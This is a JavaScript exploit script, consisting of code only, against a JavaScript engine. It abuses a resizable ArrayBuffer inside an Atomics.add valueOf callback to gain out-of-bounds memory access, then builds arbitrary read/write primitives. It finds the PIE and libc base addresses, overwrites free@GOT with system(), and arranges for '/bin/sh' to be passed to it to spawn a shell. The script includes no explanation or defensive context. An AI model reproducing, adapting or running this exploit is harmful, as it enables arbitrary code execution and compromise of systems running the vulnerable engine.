// GOT overwrite exploit - fixed target search

let bufferSize = 72;
let ab = new ArrayBuffer(bufferSize, { maxByteLength: bufferSize * 4 });
let view32 = new Int32Array(ab);

for (let i = 0; i < view32.length; i++) {
    view32[i] = 0xCCCCCCCC;
}

let backingBuf = new ArrayBuffer(64);

let targetBuf = new ArrayBuffer(0x200);
let targetView64 = new BigUint64Array(targetBuf);
for (let i = 0; i < targetView64.length; i++) {
    targetView64[i] = 0xCAFEBABECAFEBABEn;
}

let oobView32 = null;

let malicious = {
    valueOf: function() {
        ab.resize(bufferSize * 4);
        oobView32 = new Uint32Array(backingBuf);
        for (let i = 0; i < oobView32.length; i++) {
            oobView32[i] = 0x41414141;
        }
        return 0x7FFFFFF0 - 16;
    }
};

Atomics.add(view32, 16, malicious);

function isLibcPtr(val) {
    let highByte = Number((val >> 40n) & 0xFFn);
    return highByte == 0x7f && val > 0x7f0000000000n && val < 0x800000000000n;
}

function isValidPtr(val) {
    // Check high 16 bits are in PIE/heap range (0x55xx or 0x56xx)
    let high16 = Number((val >> 32n) & 0xFFFFn);
    return (high16 >= 0x5500 && high16 <= 0x56ff);
}

// Find target - search for count=0x40 with valid ptr before it
let targetJSObjIndex = -1;
let originalPtrLow = 0;
let originalPtrHigh = 0;

for (let i = 16; i < 500; i++) {
    let count = oobView32[i] >>> 0;
    if (count == 0x40) {
        let pl = oobView32[i-2] >>> 0;
        let ph = oobView32[i-1] >>> 0;
        let ptr = BigInt(ph) << 32n | BigInt(pl);
        // Found count=0x40
        if (isValidPtr(ptr)) {
            targetJSObjIndex = i;
            originalPtrLow = pl;
            originalPtrHigh = ph;
            break;
        }
    }
}

if (targetJSObjIndex < 0) throw new Error("No target");

let originalPtr = BigInt(originalPtrHigh) << 32n | BigInt(originalPtrLow);

function setTargetPtr(addrBig) {
    oobView32[targetJSObjIndex - 2] = Number(addrBig & 0xFFFFFFFFn);
    oobView32[targetJSObjIndex - 1] = Number((addrBig >> 32n) & 0xFFFFFFFFn);
}

function restorePtr() {
    oobView32[targetJSObjIndex - 2] = originalPtrLow;
    oobView32[targetJSObjIndex - 1] = originalPtrHigh;
}

function read64(addr) {
    setTargetPtr(addr);
    let val = targetView64[0];
    restorePtr();
    return val;
}

function write64(addr, val) {
    setTargetPtr(addr);
    targetView64[0] = val;
    restorePtr();
}

// Verify
if (read64(originalPtr) != 0xCAFEBABECAFEBABEn) throw new Error("R/W failed");

// Find valid pointers
let allPtrs = [];
for (let i = 0; i < 500; i += 2) {
    let low = oobView32[i] >>> 0;
    let high = oobView32[i+1] >>> 0;
    let val = BigInt(high) << 32n | BigInt(low);
    if (isValidPtr(val) && low != 0x41414141) {
        allPtrs.push({idx: i, val: val});
    }
}

allPtrs.sort((a, b) => a.val < b.val ? -1 : 1);

// Find PIE base
let pie_base = 0n;
if (allPtrs.length > 0) {
    let lowestPtr = allPtrs[0].val;
    let pageAligned = lowestPtr & 0xFFFFFFFFFFFFF000n;
    
    for (let off = 0n; off <= 0x800000n; off += 0x1000n) {
        let testBase = pageAligned - off;
        if (testBase <= 0x555000000000n) break;
        
        let magic = read64(testBase);
        if ((magic & 0xFFFFFFFFn) == 0x464c457fn) {
            pie_base = testBase;
            break;
        }
    }
}

if (pie_base == 0n) throw new Error("No PIE base");

// Read free@GOT to get libc address
let free_got = pie_base + 0x10b008n;
let free_libc = read64(free_got);

if (!isLibcPtr(free_libc)) throw new Error("free@GOT not libc");

// Find libc base
let libc_page = free_libc & 0xFFFFFFFFFFFFF000n;
let libc_base = 0n;

for (let off = 0n; off <= 0x250000n; off += 0x1000n) {
    let testBase = libc_page - off;
    let magic = read64(testBase);
    if ((magic & 0xFFFFFFFFn) == 0x464c457fn) {
        libc_base = testBase;
        break;
    }
}

if (libc_base == 0n) throw new Error("No libc base");

// Calculate system address
let system_addr = libc_base + 0x53110n;

// Overwrite free@GOT with system
write64(free_got, system_addr);

// We need to call system("/bin/sh") not system(random_heap_addr)
// The free@GOT is now system, so when any memory is freed, system() is called with that pointer
// We need to put "/bin/sh\0" at the start of a heap chunk and trigger its free

// Write "/bin/sh" into a chunk by creating arrays
// The trick: allocate an array, write /bin/sh to its backing store, then let it be freed
let shellBufs = [];
for (let i = 0; i < 100; i++) {
    let buf = new ArrayBuffer(32);
    let view = new Uint8Array(buf);
    // Write "/bin/sh\0" at the start
    view[0] = 0x2f; // /
    view[1] = 0x62; // b
    view[2] = 0x69; // i
    view[3] = 0x6e; // n
    view[4] = 0x2f; // /
    view[5] = 0x73; // s
    view[6] = 0x68; // h
    view[7] = 0x00; // null terminator
    shellBufs.push(buf);
}

// Now null out references to trigger GC freeing these
shellBufs = null;

// Force GC
for (let i = 0; i < 10000; i++) {
    let tmp = new ArrayBuffer(100);
}

print("Done");
